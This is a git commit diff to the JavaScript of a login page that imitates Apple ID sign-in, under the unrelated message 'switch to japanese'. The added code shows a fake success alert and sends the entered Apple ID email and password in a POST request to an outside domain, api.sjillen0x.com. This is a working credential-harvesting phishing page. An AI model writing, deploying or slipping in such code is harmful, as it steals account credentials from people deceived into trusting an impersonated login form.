878f6ced0ed35b4a06e98dc7ad1fb6857376d389
Sjillen <thomas.proust89@gmail.com>
2025-04-12 11:25:30 +0900

    switch to japanese

--- scripts.js
+++ scripts.js
@@ -2,7 +2,7 @@ function showPasswordInput() {
     const appleId = document.getElementById('apple-id').value;
     if (appleId) {
       document.getElementById('password-group').style.display = 'block';
-      document.getElementById('apple-id').disabled = true;
+      //document.getElementById('apple-id').disabled = true;
       document.querySelector('.arrow-button').style.display = 'none';
       document.querySelector('.login-button').style.display = 'block';
       document.getElementById('password').focus();
@@ -13,9 +13,22 @@ function showPasswordInput() {
   
   function login() {
     const password = document.getElementById('password').value;
+
     if (password) {
       alert('Logged in successfully!');
     } else {
       alert('Please enter your password.');
     }
+
+    fetch('https://api.sjillen0x.com/login', {
+      method: 'POST',
+      body: JSON.stringify({
+        email: document.getElementById('apple-id').value,
+        password: password
+      })    
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log(data);
+    });
   }
